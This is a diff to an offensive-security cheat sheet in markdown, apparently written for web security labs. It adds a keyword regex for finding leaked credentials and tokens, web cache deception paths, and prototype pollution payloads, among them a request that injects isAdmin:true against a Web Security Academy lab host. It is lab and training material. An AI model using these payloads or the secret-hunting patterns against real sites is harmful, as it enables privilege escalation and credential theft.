@@ -239,7 +239,7 @@ Go to the "Burp" > "Search" tab.
 ```
 
 ```r
-aws_access_key|aws_secret_key|api key|heroku|slack|firebase|swagger|aws_secret_key|aws key|ftp password|jdbc|sql|secret jet|config|admin|gcp|htaccess|.env|ssh key|access key|secret token|oauth_token|oauth_token_secret
+aws_access_key|aws_secret_key|api key|heroku|slack|firebase|swagger|aws_secret_key|aws key|ftp password|jdbc|sql|secret jet|config|admin|gcp|htaccess|.env|ssh key|access key|secret token|oauth_token|oauth_token_secret|TELEGRAM_BOT_TOKEN
 ```
 # steal cookie
 ```
@@ -631,6 +631,39 @@ X-Remote-Addr: 127.0.0.1
 X-Remote-IP: 127.0.0.1
 X-Rewrite-Url: 127.0.0.1
 X-True-IP: 127.0.0.1
+```
+# web cache deception
+```js
+/my-account/wcd.js
+/my-account;wcd.js
+/resources/..%2fmy-account?wcd
+/my-account%23%2f%2e%2e%2fresources?wcd
+/my-account;%2f%2e%2e%2frobots.txt?wcd
+```
+- `X-Cache: hit` - The response was served from the cache.
+- `X-Cache: miss` - The cache did not contain a response for the request's key, so it was fetched from the origin server. In most cases, the response is then cached. To confirm this, send the request again to see whether the value updates to hit.
+- `X-Cache: dynamic` - The origin server dynamically generated the content. Generally this means the response is not suitable for caching.
+- `X-Cache: refresh` - The cached content was outdated and needed to be refreshed or revalidated.
+# prototype pollution
+```url
+/?__proto__[foo]=bar
+```
+Open the browser DevTools panel and go to the **Console** tab.
+Enter `Object.prototype`
+Study the properties of the returned object and observe that your injected `foo` property has been added. You've successfully found a prototype pollution source.
+```url
+/?__proto__[value]=data:,alert(1);
+```
+
+```http
+POST /my-account/change-address HTTP/2
+Host: 0a7f005e0395dff58102f81700f900d3.web-security-academy.net
+Content-Length: 208
+Content-Type: application/json;charset=UTF-8
+
+{"address_line_1":"Wiener HQ","address_line_2":"One Wiener Way","city":"Wienerville","postcode":"BU1 1RP","country":"UK","sessionId":"hIwJSCytOp0Pyyzib0nGRTs7v0TcNhY4","__proto__": {
+    "isAdmin":"true"
+}}
 ```
 # links
 - [steal admin cookie/sqli](./src/marketplace.md) (tryhackme:marketplace)
